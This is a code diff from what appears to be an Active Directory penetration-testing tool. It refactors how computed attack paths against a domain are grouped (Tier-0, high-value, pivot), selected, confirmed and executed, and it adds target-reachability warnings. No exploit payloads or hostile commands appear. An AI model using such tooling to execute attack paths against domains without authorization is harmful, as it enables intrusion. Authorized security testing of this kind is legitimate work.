     return offer_attack_paths_for_execution_summaries(
         shell,
@@ -5265,7 +6922,7 @@ def offer_attack_paths_for_execution_for_principals(
         return False
 
     if target == "all":
-        return _offer_two_section_attack_paths(
+        return _offer_sectioned_attack_paths(
             shell,
             domain,
             summaries=summaries,
@@ -5324,9 +6981,9 @@ def offer_attack_paths_for_execution_summaries(
 ) -> bool:
     """Shared UX loop for showing/executing already computed path summaries.
 
-    When ``show_sections=True`` the table renders high-value paths first
-    (normal styling) separated from non-HV pivot paths (dim styling).
-    Callers must pass summaries pre-sorted HV-first.
+    When ``show_sections=True`` the table renders Tier-0 first, then
+    high-value paths, then pivots. Callers must pass summaries pre-grouped
+    in that order.
     """
     if not summaries:
         return False
@@ -5356,6 +7013,19 @@ def offer_attack_paths_for_execution_summaries(
 
     def _confirm_or_default(prompt: str, *, default: bool) -> bool:
         """Return `default` in non-interactive contexts to avoid blocking for input."""
+        if hasattr(shell, "_questionary_confirm"):
+            resolved = shell._questionary_confirm(
+                prompt,
+                default=default,
+                timeout_result=False,
+                context={
+                    "remote_interaction": True,
+                    "category": "attack_path_execution",
+                    "domain": domain,
+                },
+            )
+            if isinstance(resolved, bool):
+                return resolved
         if non_interactive:
             print_info_debug(
                 "[attack_paths] confirm defaulted (non-interactive): "
@@ -5407,13 +7077,10 @@ def offer_attack_paths_for_execution_summaries(
         context_username=context_username,
         context_password=context_password,
     )
-    # When rendering two sections (HV + pivot), re-group HV-first after sorting.
-    # _sorted_paths sorts globally by status/length — this restores the section
-    # grouping while preserving the relative order within each section.
+    # When rendering grouped sections, re-group after sorting so the class
+    # buckets remain stable while preserving relative order within each class.
     if show_sections:
-        summaries = [s for s in summaries if s.get("target_is_high_value")] + [
-            s for s in summaries if not s.get("target_is_high_value")
-        ]
+        summaries = _sort_target_priority_groups(summaries)
     persist_attack_path_snapshot(
         shell,
         domain,
@@ -5525,11 +7192,24 @@ def offer_attack_paths_for_execution_summaries(
 
         selected_idx = None
         if hasattr(shell, "_questionary_select"):
-            selected_idx = shell._questionary_select(
-                "Select an attack path to view details:",
-                options,
-                default_idx=default_idx,
-            )
+            try:
+                selected_idx = shell._questionary_select(
+                    "Select an attack path to view details:",
+                    options,
+                    default_idx=default_idx,
+                    context={
+                        "remote_interaction": True,
+                        "category": "attack_path_execution",
+                        "domain": domain,
+                        "candidate_count": len(summaries),
+                    },
+                )
+            except TypeError:
+                selected_idx = shell._questionary_select(
+                    "Select an attack path to view details:",
+                    options,
+                    default_idx=default_idx,
+                )
         elif non_interactive:
             selected_idx = default_idx
         else:
@@ -5720,6 +7400,21 @@ def offer_attack_paths_for_execution_summaries(
             if isinstance(selected_meta, dict)
             else None
         )
+        computer_viability_status = (
+            str(selected_meta.get("execution_target_viability_status") or "").strip().lower()
+            if isinstance(selected_meta, dict)
+            else ""
+        )
+        computer_viability_summary = (
+            str(selected_meta.get("execution_target_viability_summary") or "").strip()
+            if isinstance(selected_meta, dict)
+            else ""
+        )
+        computer_execution_advisory = (
+            str(selected_meta.get("execution_target_execution_advisory") or "").strip()
+            if isinstance(selected_meta, dict)
+            else ""
+        )
         if (
             execution_context_required
             and isinstance(execution_ready_count, int)
@@ -5747,6 +7442,23 @@ def offer_attack_paths_for_execution_summaries(
             if single_pass:
                 return executed
             continue
+        if computer_viability_status in {
+            "resolved_but_unreachable",
+            "enabled_but_unresolved",
+            "not_in_enabled_inventory",
+        }:
+            if computer_viability_summary:
+                print_warning(
+                    f"Computer target viability check: {computer_viability_summary}"
+                )
+            if computer_execution_advisory:
+                print_info(
+                    f"Execution advisory: {computer_execution_advisory}"
+                )
+            print_info_debug(
+                "[attack_paths] computer target viability warning: "
+                f"domain={marked_domain} status={mark_sensitive(computer_viability_status, 'detail')}"
+            )
 
         if status == "exploited" and not _confirm_or_default(
             "This path is already exploited. Execute again?",
@@ -5824,9 +7536,7 @@ def offer_attack_paths_for_execution_summaries(
             )
             summaries = _refresh_summaries()
             if show_sections:
-                summaries = [s for s in summaries if s.get("target_is_high_value")] + [
-                    s for s in summaries if not s.get("target_is_high_value")
-                ]
+                summaries = _sort_target_priority_groups(summaries)
             persist_attack_path_snapshot(
                 shell,
                 domain,
